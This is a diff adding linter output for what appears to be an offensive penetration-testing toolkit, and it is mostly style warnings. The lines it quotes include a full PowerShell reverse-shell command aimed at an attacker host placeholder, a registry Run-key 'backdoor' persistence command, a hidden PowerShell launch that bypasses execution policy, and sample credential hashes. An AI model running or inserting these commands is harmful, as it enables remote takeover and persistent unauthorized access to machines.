@@ -1,0 +1,113 @@
+src/__init__.py:5:82: W292 no newline at end of file
+__description__ = "Offensive security toolkit for authorized penetration testing"                                                                                 ^
+src/advanced_attacks/exploit_framework.py:11:1: F401 'json' imported but unused
+import json
+^
+src/advanced_attacks/exploit_framework.py:15:1: F401 'typing.Callable' imported but unused
+from typing import Dict, List, Optional, Any, Callable
+^
+src/advanced_attacks/exploit_framework.py:19:1: F401 'cryptography.fernet.Fernet' imported but unused
+from cryptography.fernet import Fernet
+^
+src/advanced_attacks/exploit_framework.py:20:1: F401 'cryptography.hazmat.primitives.hashes' imported but unused
+from cryptography.hazmat.primitives import hashes
+^
+src/advanced_attacks/exploit_framework.py:21:1: F401 'cryptography.hazmat.primitives.ciphers.Cipher' imported but unused
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+^
+src/advanced_attacks/exploit_framework.py:21:1: F401 'cryptography.hazmat.primitives.ciphers.algorithms' imported but unused
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+^
+src/advanced_attacks/exploit_framework.py:21:1: F401 'cryptography.hazmat.primitives.ciphers.modes' imported but unused
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+^
+src/advanced_attacks/exploit_framework.py:22:1: F401 'subprocess' imported but unused
+import subprocess
+^
+src/advanced_attacks/exploit_framework.py:23:1: F401 'tempfile' imported but unused
+import tempfile
+^
+src/advanced_attacks/exploit_framework.py:24:1: F401 'os' imported but unused
+import os
+^
+src/advanced_attacks/exploit_framework.py:237:101: E501 line too long (123 > 100 characters)
+                {"username": "admin", "password_hash": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"},
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:238:101: E501 line too long (122 > 100 characters)
+                {"username": "user1", "password_hash": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"}
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:255:101: E501 line too long (552 > 100 characters)
+            "windows": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:264:80: W291 trailing whitespace
+    async def generate_payload(self, payload_type: PayloadType, target_os: str, 
+                                                                               ^
+src/advanced_attacks/exploit_framework.py:265:30: E128 continuation line under-indented for visual indent
+                             lhost: str, lport: int, custom_options: Dict = None) -> str:
+                             ^
+src/advanced_attacks/exploit_framework.py:331:101: E501 line too long (124 > 100 characters)
+            "registry": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d \"{{PAYLOAD}}\" /f",
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:342:75: W291 trailing whitespace
+    async def establish_persistence(self, session_id: str, target: Target, 
+                                                                          ^
+src/advanced_attacks/exploit_framework.py:343:35: E128 continuation line under-indented for visual indent
+                                  method: str = "registry") -> bool:
+                                  ^
+src/advanced_attacks/exploit_framework.py:352:101: E501 line too long (107 > 100 characters)
+        payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\temp\\backdoor.ps1"
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:367:101: E501 line too long (142 > 100 characters)
+            return "Windows IP Configuration\n\nEthernet adapter Local Area Connection:\n   IP Address. . . . . . . . . . . . : 192.168.1.100"
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:437:101: E501 line too long (140 > 100 characters)
+                {"type": "hash", "username": "administrator", "value": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"},
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:444:101: E501 line too long (102 > 100 characters)
+                {"type": "ssh_key", "username": "admin", "value": "-----BEGIN PRIVATE KEY-----\n..."},
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:480:28: E128 continuation line under-indented for visual indent
+                           payload_type: PayloadType = PayloadType.REVERSE_SHELL,
+                           ^
+src/advanced_attacks/exploit_framework.py:481:28: E128 continuation line under-indented for visual indent
+                           lhost: str = "192.168.1.100", lport: int = 4444) -> ExploitResult:
+                           ^
+src/advanced_attacks/exploit_framework.py:522:101: E501 line too long (104 > 100 characters)
+                    results[operation] = await self.post_exploit.collect_system_info(session_id, target)
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:524:101: E501 line too long (106 > 100 characters)
+                    results[operation] = await self.post_exploit.establish_persistence(session_id, target)
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:528:101: E501 line too long (104 > 100 characters)
+                    results[operation] = await self.post_exploit.extract_credentials(session_id, target)
+                                                                                                    ^
+src/advanced_attacks/exploit_framework.py:596:20: W291 trailing whitespace
+            target, 
+                   ^
+src/advanced_attacks/exploit_framework.py:609:23: F541 f-string is missing placeholders
+                print(f"\nExecuting post-exploitation operations...")
+                      ^
+src/advanced_attacks/social_engineering.py:9:1: F401 'asyncio' imported but unused
+import asyncio
+^
+src/advanced_attacks/social_engineering.py:10:1: F401 'json' imported but unused
+import json
+^
+src/advanced_attacks/social_engineering.py:12:1: F401 'smtplib' imported but unused
+import smtplib
+^
+src/advanced_attacks/social_engineering.py:13:1: F401 'time' imported but unused
+import time
+^
+src/advanced_attacks/social_engineering.py:14:1: F401 'datetime.timedelta' imported but unused
+from datetime import datetime, timedelta
+^
+src/advanced_attacks/social_engineering.py:15:1: F401 'email.mime.text.MimeText' imported but unused
+from email.mime.text import MimeText
+^
+src/advanced_attacks/social_engineering.py:16:1: F401 'email.mime.multipart.MimeMultipart' imported but unused
+from email.mime.multipart import MimeMultipart
+^
+src/advanced_attacks/social_engineering.py:17:1: F401 'email.mime.base.MimeBase' imported but unused
+from email.mime.base import MimeBase
+^
